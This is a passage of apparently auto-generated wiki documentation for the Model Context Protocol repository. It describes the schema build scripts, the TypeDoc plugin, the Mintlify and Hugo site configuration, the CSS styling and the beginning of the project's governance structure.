# Generate to stdout and compare with cmp command
typedoc --entryPoints "${f%.mdx}.ts" --schemaPageTemplate "$f" | \
  cmp docs/specification/$(basename -- $(dirname -- "$f"))/schema.mdx -
```

**Sources:** [package.json:31]()

## Developer Workflow Integration

The build system provides a convenience script that orchestrates the complete development workflow:

```mermaid
graph LR
    PrepChanges["npm run prep:changes"]
    
    CheckTS["check:schema:ts<br/>tsc + eslint + prettier"]
    Generate["generate:schema<br/>JSON + MDX in parallel"]
    CheckDocs["check:docs<br/>format + links"]
    Format["format<br/>prettier --write"]
    
    PrepChanges --> CheckTS
    CheckTS --> Generate
    Generate --> CheckDocs
    CheckDocs --> Format
    
    style PrepChanges fill:#f9f9f9
```

**Sources:** [package.json:36]()

**Typical Development Flow:**

1. Edit TypeScript schema sources in `schema/draft/schema.ts`
2. Run `npm run prep:changes` to:
   - Validate TypeScript compilation and linting
   - Regenerate JSON and MDX artifacts
   - Validate documentation formatting and links
   - Auto-format all Markdown files
3. Review generated changes in `schema/draft/schema.json` and `docs/specification/draft/schema.mdx`
4. Commit all changes together (sources + generated artifacts)

**Sources:** [CONTRIBUTING.md:42-76]()

## Build Tool Configuration

### Prettier Configuration

Prettier enforces consistent formatting with repository-specific overrides:

```json
{
  "overrides": [
    {
      "files": "*.{md,mdx}",
      "options": {
        "proseWrap": "preserve"
      }
    }
  ]
}
```

The `proseWrap: "preserve"` setting prevents Prettier from reflowing prose, which is critical for Markdown files where line breaks may have semantic meaning.

**Sources:** [package.json:13-22]()

### TypeDoc Configuration

TypeDoc is configured to produce clean output for the custom plugin:

```javascript
{
  out: "tmp",
  excludeInternal: true,
  excludeTags: ["@format", "@maximum", "@minimum", "@TJS-type"],
  disableSources: true,
  logLevel: "Error",
  plugin: ["./typedoc.plugin.mjs"]
}
```

**Key Settings:**

- `excludeTags`: Removes TypeScript JSON Schema annotations from generated docs [typedoc.config.mjs:7-12]()
- `disableSources`: Omits source file links since generated MDX doesn't support them [typedoc.config.mjs:13]()
- `logLevel: "Error"`: Reduces noise during generation [typedoc.config.mjs:14]()

**Sources:** [typedoc.config.mjs:4-16]()

### ESLint Configuration

The repository uses a modern flat config with TypeScript support:

```javascript
// Inferred from devDependencies
{
  parser: "@typescript-eslint/parser",
  plugins: ["@typescript-eslint", "prettier"],
  extends: [
    "@eslint/js",
    "typescript-eslint",
    "eslint-config-prettier"
  ]
}
```

**Sources:** [package.json:41-52]()

## Tools and Dependencies

| Tool | Version | Purpose |
|------|---------|---------|
| `typescript` | ^5.6.2 | TypeScript compiler and type checking |
| `typescript-json-schema` | ^0.65.1 | Generate JSON schemas from TypeScript types |
| `typedoc` | ^0.28.14 | Generate API documentation from TypeScript |
| `tsx` | ^4.19.1 | Execute TypeScript scripts directly (used for generate-schemas.ts) |
| `prettier` | ^3.6.2 | Code formatting |
| `eslint` | ^9.8.0 | Linting |
| `typescript-eslint` | ^8.0.0 | TypeScript-specific linting rules |
| `glob` | ^11.1.0 | File pattern matching (used in generate-schemas.ts) |
| `ajv` | ^8.17.1 | JSON Schema validation |

**Node.js Requirement:** The build system requires Node.js 20 or higher [package.json:10-12]()

**Sources:** [package.json:40-56]()

## Performance Characteristics

The build system employs several optimization strategies:

1. **Parallel Schema Generation**: All 5 schema versions (draft, 2025-11-25, 2025-06-18, 2025-03-26, 2024-11-05) are generated concurrently [scripts/generate-schemas.ts:119-121, 135-137]()

2. **Parallel MDX Generation**: Uses shell `xargs -P 0` for maximum parallelism [package.json:35]()

3. **Incremental Validation**: CI runs three separate check steps, allowing early failure on TypeScript errors before expensive schema generation [.github/workflows/main.yml:21-28]()

4. **Path-Based Triggers**: Markdown validation workflow only runs when documentation files change [.github/workflows/markdown-format.yml:5-11]()

**Typical Execution Times:**
- `npm run check:schema:ts`: ~5-10 seconds (TypeScript compilation + linting)
- `npm run check:schema:json`: ~15-20 seconds (5 schemas in parallel)
- `npm run check:schema:md`: ~20-25 seconds (5 MDX generations in parallel)

**Sources:** [scripts/generate-schemas.ts:33-35, 119-121](), [package.json:33-35]()

---

# Page: Documentation Generation System

# Documentation System

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [.gitattributes](.gitattributes)
- [.prettierignore](.prettierignore)
- [docs/specification/2025-06-18/schema.mdx](docs/specification/2025-06-18/schema.mdx)
- [docs/specification/2025-11-25/schema.mdx](docs/specification/2025-11-25/schema.mdx)
- [docs/style.css](docs/style.css)
- [package-lock.json](package-lock.json)
- [package.json](package.json)
- [schema/2025-06-18/schema.mdx](schema/2025-06-18/schema.mdx)
- [schema/2025-06-18/schema.ts](schema/2025-06-18/schema.ts)
- [schema/2025-11-25/schema.ts](schema/2025-11-25/schema.ts)
- [scripts/check-mdx-comments.ts](scripts/check-mdx-comments.ts)
- [scripts/generate-schemas.ts](scripts/generate-schemas.ts)
- [scripts/pull-registry-docs.sh](scripts/pull-registry-docs.sh)
- [tsconfig.json](tsconfig.json)
- [typedoc.config.mjs](typedoc.config.mjs)
- [typedoc.plugin.mjs](typedoc.plugin.mjs)

</details>



## Purpose and Scope

The documentation system implements a dual-track publishing architecture that serves both technical reference documentation and community blog content. Mintlify powers the main documentation site at `modelcontextprotocol.io`, while Hugo with the PaperMod theme hosts the blog at `blog.modelcontextprotocol.io`. This page covers the configuration, generation pipelines, multi-version navigation, and styling systems that make up the documentation infrastructure.

For information about the build system and CI/CD workflows that validate and generate documentation artifacts, see [Build System and CI/CD](#6.4). For details on the schema generation process itself, see [Schema Development Workflow](#6.3).

## Architecture Overview

The documentation system consists of two independent publishing tracks with distinct toolchains and content types:

```mermaid
graph TB
    subgraph "Content Sources"
        HandWritten["Hand-Written MDX<br/>docs/**/*.mdx"]
        SchemaTS["Schema TypeScript<br/>schema/*/schema.ts"]
        BlogMD["Blog Markdown<br/>blog/content/**/*.md"]
    end
    
    subgraph "Generation Pipeline"
        TypeDocPlugin["TypeDoc Plugin<br/>typedoc.plugin.mjs<br/>schema-page output"]
        Prettier["Prettier<br/>Formatting"]
    end
    
    subgraph "Configuration"
        DocsJSON["docs.json<br/>Mintlify Config<br/>Navigation & Versions"]
        HugoTOML["hugo.toml<br/>Hugo Config<br/>Theme & Menu"]
        StyleCSS["style.css<br/>Custom Styling"]
    end
    
    subgraph "Published Sites"
        Mintlify["Mintlify<br/>modelcontextprotocol.io<br/>Main Documentation"]
        HugoBlog["Hugo Site<br/>blog.modelcontextprotocol.io<br/>Community Blog"]
    end
    
    SchemaTS -->|typedoc| TypeDocPlugin
    TypeDocPlugin -->|generates| SchemaMDX["schema.mdx<br/>Generated API Docs"]
    
    HandWritten --> Prettier
    SchemaMDX --> Prettier
    Prettier -->|formatted| DocsJSON
    
    DocsJSON --> Mintlify
    StyleCSS --> Mintlify
    
    BlogMD --> HugoTOML
    HugoTOML --> HugoBlog
```

**Sources:** [docs/docs.json:1-462](), [blog/hugo.toml:1-71](), [typedoc.plugin.mjs:1-243](), [docs/style.css:1-207]()

## Mintlify Main Documentation

### Configuration Structure

The `docs.json` file serves as the central configuration for the Mintlify documentation site. It defines theme colors, navigation structure, multi-version support, and URL redirects.

```mermaid
graph LR
    DocsJSON["docs.json"]
    
    subgraph "Top-Level Configuration"
        Theme["Theme & Colors<br/>theme: mint<br/>primary: #09090b"]
        Navbar["Navbar Links<br/>Blog<br/>GitHub"]
        SEO["SEO Settings<br/>og:image<br/>indexing: navigable"]
        Footer["Footer Socials<br/>GitHub"]
    end
    
    subgraph "Navigation System"
        Tabs["Tabs<br/>Documentation<br/>Specification<br/>Community"]
        DocPages["Documentation Pages<br/>Getting Started<br/>Learn<br/>Develop<br/>Tools"]
        SpecVersions["Specification Versions<br/>2025-11-25<br/>2025-06-18<br/>2025-03-26<br/>2024-11-05<br/>Draft"]
        CommunityPages["Community Pages<br/>Communication<br/>Governance<br/>Examples"]
    end
    
    Redirects["Redirects<br/>/specification/latest<br/>Legacy URL mappings"]
    
    DocsJSON --> Theme
    DocsJSON --> Navbar
    DocsJSON --> SEO
    DocsJSON --> Footer
    DocsJSON --> Tabs
    
    Tabs --> DocPages
    Tabs --> SpecVersions
    Tabs --> CommunityPages
    
    DocsJSON --> Redirects
```

**Sources:** [docs/docs.json:1-462]()

### Theme Configuration

The theme is configured with minimal, monochrome colors optimized for technical documentation:

| Property | Value | Purpose |
|----------|-------|---------|
| `$schema` | `https://mintlify.com/docs.json` | Schema validation |
| `theme` | `"mint"` | Base theme selection |
| `colors.primary` | `"#09090b"` | Near-black primary color |
| `colors.light` | `"#FAFAFA"` | Light mode background |
| `colors.dark` | `"#09090b"` | Dark mode background |
| `favicon` | `"/favicon.svg"` | Site icon |
| `logo.light` | `"/logo/light.svg"` | Light mode logo |
| `logo.dark` | `"/logo/dark.svg"` | Dark mode logo |

**Sources:** [docs/docs.json:2-10](), [docs/docs.json:353-356]()

### Tab-Based Navigation

The navigation system uses a three-tab structure to organize different content types:

```mermaid
graph TD
    Root["Navigation Root"]
    
    subgraph "Documentation Tab"
        GetStarted["Get started<br/>intro"]
        AboutMCP["About MCP<br/>architecture<br/>server-concepts<br/>client-concepts<br/>versioning"]
        Develop["Develop with MCP<br/>connect servers<br/>build server/client<br/>SDK<br/>Security"]
        Tools["Developer tools<br/>inspector"]
    end
    
    subgraph "Specification Tab"
        V20251125["2025-11-25 (latest)<br/>Base Protocol<br/>Client/Server Features"]
        V20250618["2025-06-18<br/>Base Protocol<br/>Client/Server Features"]
        V20250326["2025-03-26"]
        V20241105["2024-11-05"]
        Draft["Draft<br/>Active Development"]
    end
    
    subgraph "Community Tab"
        Communication["Communication"]
        Governance["Governance<br/>SEP Guidelines<br/>Working Groups"]
        Examples["Roadmap<br/>Clients<br/>Examples"]
    end
    
    Root --> GetStarted
    Root --> AboutMCP
    Root --> Develop
    Root --> Tools
    
    Root --> V20251125
    Root --> V20250618
    Root --> V20250326
    Root --> V20241105
    Root --> Draft
    
    Root --> Communication
    Root --> Governance
    Root --> Examples
```

The navigation is defined using nested page groups in [docs/docs.json:23-351](). Each tab contains a hierarchical structure of page groups and individual pages.

**Sources:** [docs/docs.json:23-351]()

### Multi-Version Specification Support

The Specification tab implements version-based navigation where each version is a complete, independent documentation tree:

```json
{
  "tab": "Specification",
  "versions": [
    {
      "version": "Version 2025-11-25 (latest)",
      "pages": [
        "specification/2025-11-25/index",
        "specification/2025-11-25/changelog",
        {
          "group": "Base Protocol",
          "pages": ["specification/2025-11-25/basic/index", ...]
        }
      ]
    }
  ]
}
```

Each version directory (`specification/2025-11-25/`, `specification/draft/`, etc.) contains a complete set of documentation files including:
- Index and changelog
- Architecture documentation
- Base protocol specification
- Client and server features
- Auto-generated schema reference (`schema.mdx`)

**Sources:** [docs/docs.json:64-321]()

### Redirect System

The redirect system handles both version aliasing and legacy URL migrations:

| Source | Destination | Type | Purpose |
|--------|-------------|------|---------|
| `/specification/latest` | `/specification/2025-11-25` | Version alias | Points to current stable |
| `/specification/latest/:slug*` | `/specification/2025-11-25/:slug*` | Version alias | Preserves deep links |
| `/quickstart` | `/docs/develop/build-server` | Legacy URL | Content reorganization |
| `/docs/concepts/*` | `/specification/*/` or `/docs/learn/*` | Legacy URL | Content split |

The redirects support wildcard patterns using `:slug*` syntax for path preservation. The `permanent: false` flag indicates these are temporary redirects that may change as versions evolve.

**Sources:** [docs/docs.json:368-455]()

## Hugo Blog System

### Blog Configuration

The blog uses Hugo static site generator with the PaperMod theme. The configuration is significantly simpler than the main documentation:

```mermaid
graph TB
    HugoTOML["hugo.toml"]
    
    subgraph "Site Settings"
        BaseURL["baseURL<br/>blog.modelcontextprotocol.io"]
        Title["title<br/>Model Context Protocol Blog"]
        Theme["theme<br/>github.com/adityatelange/hugo-PaperMod"]
    end
    
    subgraph "Content Settings"
        Pagination["pagerSize: 5"]
        Author["author: The MCP project"]
        HomeInfo["homeInfoParams<br/>Latest updates message"]
    end
    
    subgraph "PaperMod Settings"
        ThemeToggle["disableThemeToggle: false"]
        Features["ShowReadingTime: true<br/>ShowPostNavLinks: true<br/>ShowBreadCrumbs: true<br/>ShowCodeCopyButtons: true"]
        RSS["ShowFullTextinRSS: true"]
    end
    
    subgraph "Menu"
        MenuDocs["Documentation Link"]
        MenuGitHub["GitHub Link"]
    end
    
    subgraph "Markup"
        Highlight["Syntax Highlighting<br/>style: monokai"]
        Goldmark["goldmark.renderer<br/>unsafe: true"]
    end
    
    HugoTOML --> BaseURL
    HugoTOML --> Title
    HugoTOML --> Theme
    HugoTOML --> Pagination
    HugoTOML --> Author
    HugoTOML --> HomeInfo
    HugoTOML --> ThemeToggle
    HugoTOML --> Features
    HugoTOML --> RSS
    HugoTOML --> MenuDocs
    HugoTOML --> MenuGitHub
    HugoTOML --> Highlight
    HugoTOML --> Goldmark
```

**Sources:** [blog/hugo.toml:1-71]()

### Theme and Appearance

The blog uses PaperMod theme imported as a Hugo module:

```toml
theme = 'github.com/adityatelange/hugo-PaperMod'

[module]
  [[module.imports]]
    path = 'github.com/adityatelange/hugo-PaperMod'
```

Key PaperMod features enabled:
- Theme toggle (light/dark mode)
- Reading time estimation
- Post navigation links
- Breadcrumb navigation
- Code copy buttons
- Full RSS feed text

**Sources:** [blog/hugo.toml:5-5](), [blog/hugo.toml:18-33](), [blog/hugo.toml:68-71]()

### Menu Configuration

The blog menu provides cross-navigation to the main documentation site:

```toml
[[menu.main]]
  identifier = "docs"
  name = "Documentation"
  url = "https://modelcontextprotocol.io/docs"
  weight = 10

[[menu.main]]
  identifier = "github"
  name = "GitHub"
  url = "https://github.com/modelcontextprotocol"
  weight = 20
```

**Sources:** [blog/hugo.toml:47-58]()

### Syntax Highlighting

Markdown code blocks use Monokai color scheme with automatic language detection:

```toml
[markup.highlight]
  guessSyntax = true
  style = "monokai"
```

The `unsafe: true` option in the Goldmark renderer allows raw HTML in Markdown content, enabling rich formatting when needed.

**Sources:** [blog/hugo.toml:60-67]()

## Schema Documentation Pipeline

### TypeDoc Configuration

The TypeDoc configuration defines how TypeScript schema definitions are processed into documentation:

```javascript
/** @type {Partial<import("typedoc").TypeDocOptions>} */
const config = {
  out: "tmp",
  excludeInternal: true,
  excludeTags: ["@format", "@maximum", "@minimum", "@TJS-type"],
  disableSources: true,
  logLevel: "Error",
  plugin: ["./typedoc.plugin.mjs"],
};
```

Key settings:
- **`excludeInternal`**: Hides internal implementation details
- **`excludeTags`**: Filters JSON Schema-specific tags from documentation
- **`disableSources`**: Omits source file links (not relevant for published docs)
- **`plugin`**: Loads custom schema-page plugin

**Sources:** [typedoc.config.mjs:4-16]()

### Custom TypeDoc Plugin Architecture

The custom plugin (`typedoc.plugin.mjs`) implements a specialized renderer that outputs Mintlify-compatible Markdown instead of HTML:

```mermaid
graph TB
    Plugin["typedoc.plugin.mjs<br/>load() function"]
    
    subgraph "Plugin Components"
        SchemaPageOutput["schema-page Output<br/>Custom Output Type"]
        SchemaPageRouter["SchemaPageRouter<br/>Custom URL Generation"]
        Template["Template Rendering<br/>renderTemplate()"]
        CategorySystem["Category System<br/>renderCategory()"]
    end
    
    subgraph "Processing Pipeline"
        TemplateFile["Template File<br/>schema-page-template.mdx"]
        ReflectionEvents["TypeDoc Reflections<br/>Interfaces, Types, etc"]
        CategoryMarkers["Category Markers<br/>{/* @category Name */}"]
        RenderedMDX["Rendered schema.mdx<br/>Mintlify-compatible"]
    end
    
    Plugin --> SchemaPageOutput
    Plugin --> SchemaPageRouter
    Plugin --> Template
    Plugin --> CategorySystem
    
    Template --> TemplateFile
    Template --> CategoryMarkers
    ReflectionEvents --> CategorySystem
    CategorySystem --> RenderedMDX
    
    SchemaPageRouter -->|generates| Anchors["#anchor-ids<br/>Lowercase, no dots"]
```

**Sources:** [typedoc.plugin.mjs:1-243]()

### Schema Page Router

The `SchemaPageRouter` class extends TypeDoc's default router to generate Mintlify-compatible anchor links:

```javascript
class SchemaPageRouter extends typedoc.StructureRouter {
  getFullUrl(target) {
    return "#" + this.getAnchor(target);
  }

  getAnchor(target) {
    if (target instanceof typedoc.DeclarationReflection &&
        target.kindOf(typedoc.ReflectionKind.Property) &&
        !hasComment(target)) {
      return "";
    } else {
      // Must use `toLowerCase()` because Mintlify generates lower case IDs
      return super.getFullUrl(target)
        .replace(".html", "")
        .replaceAll(/[./#]/g, "-")
        .toLowerCase();
    }
  }
}
```

This transformation ensures that:
- Properties without comments don't generate anchors
- Anchors are lowercase (Mintlify requirement)
- Special characters (`.`, `/`, `#`) are replaced with hyphens
- HTML file extensions are removed

**Sources:** [typedoc.plugin.mjs:34-58]()

### Template-Based Rendering

The plugin uses a template file with category markers that get replaced with generated content:

```markdown
{/* @category Common Types */}

{/* @category `initialize` */}

{/* @category Tool Messages */}
```

The `renderTemplate()` function processes these markers:

1. Finds all reflections matching each category
2. Sorts reflections by a category-specific order (e.g., Request before Response)
3. Renders each reflection using TypeDoc's default theme
4. Replaces the marker with rendered content

If a category exists in the TypeScript schema but isn't in the template, an error is thrown to prevent missing documentation.

**Sources:** [typedoc.plugin.mjs:98-126](), [typedoc.plugin.mjs:176-192]()

### Mintlify Compatibility Transformations

The plugin applies several transformations to make TypeDoc output compatible with Mintlify's Markdown parser:

```javascript
// Convert <hN> elements to <div> for data attributes
content = content
  .replaceAll(/<h([1-6])/g, `<div data-typedoc-h="$1"`)
  .replaceAll(/<\/h[1-6]>/g, `</div>`);

// Reduce code block indent
content = content.replaceAll("\u00A0\u00A0", "\u00A0");

// Accommodate Mintlify's broken Markdown parser
content = content
  .replaceAll("\u00A0", "&nbsp;")          // Encode non-breaking spaces
  .replaceAll(/\n+</g, " <")               // Newlines around tags
  .replaceAll("[", "&#x5B;")               // Escape brackets
  .replaceAll("_", "&#x5F;")               // Escape underscores
  .replaceAll("{", "&#x7B;")               // Escape braces
  .replaceAll("$", "&#x24;");              // Escape dollar signs
```

These transformations address various parser issues in Mintlify while maintaining semantic correctness.

**Sources:** [typedoc.plugin.mjs:213-228]()

### Reflection Ordering

The plugin implements custom ordering for RPC method categories to ensure logical documentation flow:

```javascript
function getReflectionOrder(category, reflection1, reflection2) {
  let order = 0;

  if (isRpcMethodCategory(category)) {
    order ||= +reflection2.name.endsWith("Request") 
            - +reflection1.name.endsWith("Request");
    order ||= +reflection2.name.endsWith("RequestParams") 
            - +reflection1.name.endsWith("RequestParams");
    order ||= +reflection2.name.endsWith("Result") 
            - +reflection1.name.endsWith("Result");
    // ... notifications, etc.
  }

  order ||= reflection1.name.localeCompare(reflection2.name);
  return order;
}
```

This ensures Request types appear before Result types, which appear before Notification types, providing intuitive ordering for protocol message documentation.

**Sources:** [typedoc.plugin.mjs:136-157]()

## Styling and Customization

### Custom CSS Architecture

The `style.css` file provides custom styling that extends Mintlify's default theme:

```mermaid
graph TB
    StyleCSS["style.css"]
    
    subgraph "Global Styles"
        FontMono["Monospace Font<br/>JetBrains Mono"]
        Headings["Heading Weights<br/>h5: 500<br/>h6: 400"]
    end
    
    subgraph "Feature Matrix"
        MatrixLayout["Table Layout<br/>width: 100%<br/>table-layout: fixed"]
        MatrixFont["Font Size<br/>0.75rem"]
        MatrixAlign["Alignment<br/>Center cells<br/>Left-align first column"]
    end
    
    subgraph "Section Numbering"
        EnableFlag["#enable-section-numbers<br/>Activation Element"]
        Counters["CSS Counters<br/>h2-counter through h6-counter"]
        Numbering["Auto Numbering<br/>1. 1.1 1.1.1 etc"]
    end
    
    subgraph "Schema Reference"
        SchemaFlag["#schema-reference<br/>Activation Element"]
        Comments["Comment Styling<br/>.tsd-comment"]
        Signatures["Type Signatures<br/>.tsd-signature"]
        Members["Member Styling<br/>.tsd-member"]
    end
    
    StyleCSS --> FontMono
    StyleCSS --> Headings
    StyleCSS --> MatrixLayout
    StyleCSS --> MatrixFont
    StyleCSS --> MatrixAlign
    StyleCSS --> EnableFlag
    EnableFlag --> Counters
    Counters --> Numbering
    StyleCSS --> SchemaFlag
    SchemaFlag --> Comments
    SchemaFlag --> Signatures
    SchemaFlag --> Members
```

**Sources:** [docs/style.css:1-207]()

### Monospace Font Configuration

The custom monospace font is configured to match Mintlify's theme system:

```css
#content-area {
  --font-mono: var(--font-jetbrains-mono), ui-monospace, SFMono-Regular, 
               Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}
```

This uses Mintlify's CSS custom properties for theme consistency.

**Sources:** [docs/style.css:1-3]()

### Feature Support Matrix Styling

Special styling for the client feature support matrix table:

```css
#feature-support-matrix-wrapper table {
  width: 100%;
  table-layout: fixed;
  font-size: 0.75rem;
}

#feature-support-matrix-wrapper td:first-child,
#feature-support-matrix-wrapper th:first-child {
  text-align: left;  /* Client column left-aligned */
}
```

This creates a compact, fixed-width table optimized for displaying the 96+ clients and their feature support levels.

**Sources:** [docs/style.css:13-30]()

### Automatic Section Numbering

The CSS implements automatic hierarchical section numbering using CSS counters:

```css
body:has(#enable-section-numbers) {
  #content-area,
  #table-of-contents {
    counter-reset: h2-counter h3-counter h4-counter h5-counter h6-counter;
  }

  #content-area h2[id]::before {
    counter-increment: h2-counter;
    content: counter(h2-counter) ". ";
  }

  #content-area h3[id]::before {
    counter-increment: h3-counter;
    content: counter(h2-counter) "." counter(h3-counter) " ";
  }
  
  /* ... continues for h4, h5, h6 */
}
```

The numbering is activated by including an element with `id="enable-section-numbers"` in the page. This provides hierarchical numbering (1, 1.1, 1.1.1, etc.) while maintaining semantic HTML structure.

**Sources:** [docs/style.css:33-100]()

### Schema Reference Styling

Schema reference pages receive specialized styling for TypeDoc-generated content:

```css
body:has(#schema-reference) {
  .tsd-signature {
    font-family: var(--font-mono);
    font-size: 0.875rem;
    margin: 1.25rem 0;
    border: 1px solid;
    border-color: light-dark(rgb(var(--gray-950)/.1), rgba(255, 255, 255, 0.1));
    border-radius: 1rem;
    padding: 1rem 0.875rem;
  }

  .tsd-signature-keyword {
    color: light-dark(rgb(207, 34, 46), #9CDCFE);
  }

  .tsd-kind-interface {
    color: light-dark(rgb(149, 56, 0), #4EC9B0);
  }
}
```

This provides syntax highlighting for TypeScript type signatures using the `light-dark()` CSS function for automatic theme support.

**Sources:** [docs/style.css:104-206]()

## Content Management

### Generated Content Markers

The repository uses `.gitattributes` to mark generated files for language statistics exclusion:

```
schema/*/schema.json linguist-generated=true
docs/specification/*/schema.md linguist-generated=true
docs/specification/*/schema.mdx linguist-generated=true
```

This ensures GitHub doesn't count auto-generated documentation in repository language statistics.

**Sources:** [.gitattributes:1-5]()

### Formatting Exclusions

The `.prettierignore` file prevents Prettier from modifying generated schema documentation:

```
docs/specification/*/schema.md
docs/specification/*/schema.mdx
```

This is critical because:
1. Generated files should match their generation pipeline output exactly
2. Manual formatting changes would be overwritten on regeneration
3. CI validation checks for exact matches between committed and generated files

**Sources:** [.prettierignore:1-3]()

### Content Organization Pattern

The documentation follows a clear separation between generated and hand-written content:

| Content Type | Location | Source | Formatting |
|--------------|----------|--------|------------|
| Hand-written guides | `docs/**/*.mdx` | Authors | Prettier-formatted |
| Generated schema docs | `docs/specification/*/schema.mdx` | TypeDoc plugin | Unformatted (excluded) |
| Generated JSON schemas | `schema/*/schema.json` | typescript-json-schema | Unformatted (excluded) |
| Blog posts | `blog/content/**/*.md` | Authors | Hugo-processed |
| Static assets | `blog/static/**/*` | Various | Unprocessed |

**Sources:** [.prettierignore:1-3](), [.gitattributes:1-5]()

## Inspector Documentation Integration

The Inspector tool documentation demonstrates the integration between different documentation systems:

```markdown
The [MCP Inspector](https://github.com/modelcontextprotocol/inspector) is an 
interactive developer tool for testing and debugging MCP servers. While the 
[Debugging Guide](/legacy/tools/debugging) covers the Inspector as part of 
the overall debugging toolkit, this document provides a detailed exploration...
```

The documentation uses:
- External links to GitHub repositories: `[MCP Inspector](https://github.com/...)`
- Internal cross-references to other pages: `[Debugging Guide](/legacy/tools/debugging)`
- Mintlify components like `<Frame>`, `<Tabs>`, and `<CardGroup>`

**Sources:** [docs/docs/tools/inspector.mdx:1-159]()

### Inspector Features Documentation Structure

The Inspector documentation follows a hierarchical structure:

```mermaid
graph TD
    Inspector["MCP Inspector Page<br/>docs/tools/inspector.mdx"]
    
    GettingStarted["Getting Started<br/>Installation<br/>npm/PyPI/Local"]
    
    Features["Feature Overview<br/>Server Connection<br/>Resources<br/>Prompts<br/>Tools<br/>Notifications"]
    
    BestPractices["Best Practices<br/>Development Workflow<br/>Iterative Testing<br/>Edge Cases"]
    
    NextSteps["Next Steps<br/>Links to Inspector Repo<br/>Links to Debugging Guide"]
    
    Inspector --> GettingStarted
    Inspector --> Features
    Inspector --> BestPractices
    Inspector --> NextSteps
```

**Sources:** [docs/docs/tools/inspector.mdx:1-159]()

## Multi-Site Coordination

### Cross-Site Navigation

The two documentation sites maintain bidirectional links:

**Blog → Main Docs:**
```toml
[[menu.main]]
  identifier = "docs"
  name = "Documentation"
  url = "https://modelcontextprotocol.io/docs"
```

**Main Docs → Blog:**
```json
{
  "navbar": {
    "links": [
      {
        "label": "Blog",
        "href": "https://blog.modelcontextprotocol.io"
      }
    ]
  }
}
```

**Sources:** [blog/hugo.toml:47-51](), [docs/docs.json:11-22]()

### Asset Management

Static assets are organized separately for each site:

| Asset Type | Blog Location | Main Docs Location | Format |
|------------|--------------|-------------------|---------|
| Favicon | `blog/static/favicon.svg` | `/favicon.svg` | SVG |
| Logo | N/A | `/logo/light.svg`, `/logo/dark.svg` | SVG |
| OG Image | `blog/static/og-image.png` | Mintlify CDN | PNG |
| Post Images | `blog/static/posts/images/*` | N/A | Various |

The blog's `static/` directory is served at the site root, while Mintlify manages assets through its platform.

**Sources:** [blog/static/og-image.png:1](), [blog/hugo.toml:35-36](), [docs/docs.json:10-10]()

### Version URL Patterns

The documentation system uses consistent URL patterns across versions:

```
/specification/2025-11-25/index
/specification/2025-11-25/basic/lifecycle
/specification/2025-11-25/server/tools
/specification/2025-11-25/schema

/specification/2025-06-18/index
/specification/2025-06-18/basic/lifecycle
/specification/2025-06-18/server/tools
/specification/2025-06-18/schema

/specification/latest  -> redirects to 2025-11-25
```

Each version maintains identical path structures, ensuring consistent deep linking across versions.

**Sources:** [docs/docs.json:66-169]()

---

# Page: Governance and Community

# Governance and Community

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [MAINTAINERS.md](MAINTAINERS.md)
- [blog/content/posts/2025-11-25-first-mcp-anniversary.md](blog/content/posts/2025-11-25-first-mcp-anniversary.md)
- [blog/layouts/partials/footer.html](blog/layouts/partials/footer.html)
- [blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp](blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp)
- [blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp](blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp.webp)
- [docs/community/antitrust.mdx](docs/community/antitrust.mdx)
- [docs/community/communication.mdx](docs/community/communication.mdx)
- [docs/community/contributing.mdx](docs/community/contributing.mdx)
- [docs/community/governance.mdx](docs/community/governance.mdx)
- [docs/community/sep-guidelines.mdx](docs/community/sep-guidelines.mdx)
- [docs/community/working-interest-groups.mdx](docs/community/working-interest-groups.mdx)
- [docs/specification/2024-11-05/index.mdx](docs/specification/2024-11-05/index.mdx)
- [docs/specification/2025-03-26/index.mdx](docs/specification/2025-03-26/index.mdx)
- [docs/specification/2025-06-18/index.mdx](docs/specification/2025-06-18/index.mdx)
- [docs/specification/2025-11-25/index.mdx](docs/specification/2025-11-25/index.mdx)
- [docs/specification/draft/index.mdx](docs/specification/draft/index.mdx)

</details>



This page documents the Model Context Protocol's governance structure, community organization, and the processes for proposing and implementing changes to the specification. It covers the maintainer hierarchy, the Specification Enhancement Proposal (SEP) workflow, Working Groups and Interest Groups, communication channels, and the project's release history.

For technical contribution guidelines including schema development and build processes, see [Development Guide](#6).

## Governance Structure

MCP adopts a hierarchical governance model inspired by Python, PyTorch, and similar open-source projects. The structure balances community input with decision-making efficiency through three tiers of leadership.

### Hierarchy Overview

```mermaid
graph TB
    Lead["Lead Maintainers (2)<br/>BDFLs<br/>Ultimate Authority"]
    Core["Core Maintainers (9)<br/>Specification Oversight<br/>Design & Review"]
    Maintainers["Maintainers (58)<br/>Domain Specialists<br/>SDK, Projects, WG/IG"]
    Contributors["Contributors<br/>Community<br/>Issues, PRs, Discussions"]
    
    Lead -->|"appoint/remove"| Core
    Core -->|"appoint/remove"| Maintainers
    Lead -->|"veto power"| Core
    Core -->|"veto by majority"| Maintainers
    
    Contributors -->|"propose"| Maintainers
    Contributors -->|"propose"| Core
    Maintainers -->|"sponsor"| Core
    
    style Lead fill:#f9f9f9
    style Core fill:#f9f9f9
    style Maintainers fill:#f9f9f9
```

**Sources:** [docs/community/governance.mdx:20-71](), [MAINTAINERS.md:1-180](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:32-58]()

### Lead Maintainers (BDFLs)

The two Lead Maintainers serve as Benevolent Dictators for Life (BDFLs):
- **David Soria Parra** (`@dsp-ant`)
- **Justin Spahr-Summers** (`@jspahrsummers`, currently inactive)

Lead Maintainers have ultimate veto authority over all decisions and are responsible for:
- Confirming or removing Core Maintainers
